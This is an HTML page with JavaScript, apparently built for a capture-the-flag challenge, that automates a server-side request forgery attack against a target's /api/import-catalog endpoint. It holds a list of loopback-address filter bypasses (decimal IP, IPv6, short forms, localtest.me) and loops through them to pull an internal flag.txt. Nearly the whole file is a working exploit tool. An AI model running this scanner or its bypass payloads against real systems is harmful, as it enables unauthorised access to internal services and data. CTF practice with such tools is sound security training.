<!DOCTYPE html>
<html lang="th">
<head>
    <meta charset="UTF-8">
    <title>Sacred Water SSRF Scanner</title>
    <style>
        body { font-family: 'Courier New', Courier, monospace; background: #0d1117; color: #58a6ff; padding: 20px; }
        .container { max-width: 900px; margin: auto; background: #161b22; padding: 20px; border-radius: 8px; border: 1px solid #30363d; box-shadow: 0 4px 20px rgba(0,0,0,0.5); }
        h1 { color: #f0883e; text-align: center; border-bottom: 1px solid #30363d; padding-bottom: 10px; }
        .input-group { margin: 15px 0; }
        label { display: block; margin-bottom: 5px; font-weight: bold; }
        input { width: 100%; padding: 12px; background: #0d1117; border: 1px solid #30363d; color: #c9d1d9; border-radius: 4px; box-sizing: border-box; }
        .actions { display: flex; gap: 10px; margin-top: 20px; }
        button { flex: 1; padding: 12px; cursor: pointer; border: none; border-radius: 4px; font-weight: bold; transition: 0.3s; }
        .btn-scan { background: #238636; color: white; }
        .btn-scan:hover { background: #2ea043; }
        #results { margin-top: 20px; }
        .result-item { background: #0d1117; border: 1px solid #30363d; padding: 10px; margin-bottom: 10px; border-radius: 4px; }
        .status-200 { border-left: 5px solid #238636; }
        .status-error { border-left: 5px solid #da3633; }
        pre { white-space: pre-wrap; word-wrap: break-word; font-size: 12px; color: #8b949e; }
        .flag-highlight { color: #f0883e; font-size: 1.2em; font-weight: bold; background: rgba(240,136,62,0.1); padding: 5px; }
    </style>
</head>
<body>

<div class="container">
    <h1>🌊 Sacred Water SSRF Exploit</h1>
    <p style="text-align: center; color: #8b949e;">Bypassing Internal Address Filters</p>

    <div class="input-group">
        <label>Target URL (เว็บโจทย์):</label>
        <input type="text" id="targetUrl" placeholder="http://34.x.x.x:3000" value="">
    </div>

    <div class="actions">
        <button class="btn-scan" onclick="startScan()">เริ่ม Scan หา Flag</button>
    </div>

    <div id="results">
        </div>
</div>

<script>
    // รายการ Payload สำหรับ Bypass Filter
    const payloads = [
        "http://127.0.0.1/flag.txt",
        "http://localhost/flag.txt",
        "http://0.0.0.0/flag.txt",
        "http://[::]/flag.txt",
        "http://[::1]/flag.txt",
        "http://127.1/flag.txt",
        "http://2130706433/flag.txt", // 127.0.0.1 in decimal
        "http://localtest.me/flag.txt",
        "http://0/flag.txt"
    ];

    async function startScan() {
        const target = document.getElementById('targetUrl').value.trim();
        const resultsDiv = document.getElementById('results');
        
        if (!target) {
            alert("ใส่ URL ของเว็บโจทย์ก่อนครับ!");
            return;
        }

        resultsDiv.innerHTML = "<h3>กำลังสแกน...</h3>";

        for (const url of payloads) {
            const item = document.createElement('div');
            item.className = 'result-item';
            item.innerHTML = `<strong>Testing:</strong> ${url}...`;
            resultsDiv.prepend(item);

            try {
                const resp = await fetch(`${target}/api/import-catalog`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ url: url })
                });

                const data = await resp.json();
                
                let content = JSON.stringify(data, null, 2);
                let isFlag = content.includes("web{");

                item.classList.add(resp.ok ? 'status-200' : 'status-error');
                item.innerHTML = `
                    <strong>Payload:</strong> ${url} <br>
                    <strong>HTTP:</strong> ${resp.status} <br>
                    <pre>${isFlag ? '<span class="flag-highlight">' + content + '</span>' : content}</pre>
                `;

                if (isFlag) {
                    alert("🚩 เจอ Flag แล้ว! ตรวจสอบที่รายการบนสุด");
                    break; // หยุดสแกนเมื่อเจอ Flag
                }

            } catch (err) {
                item.classList.add('status-error');
                item.innerHTML += `<br><span style="color:#da3633;">Network Error: ${err.message}</span>`;
            }
        }
    }
</script>

</body>
</html>
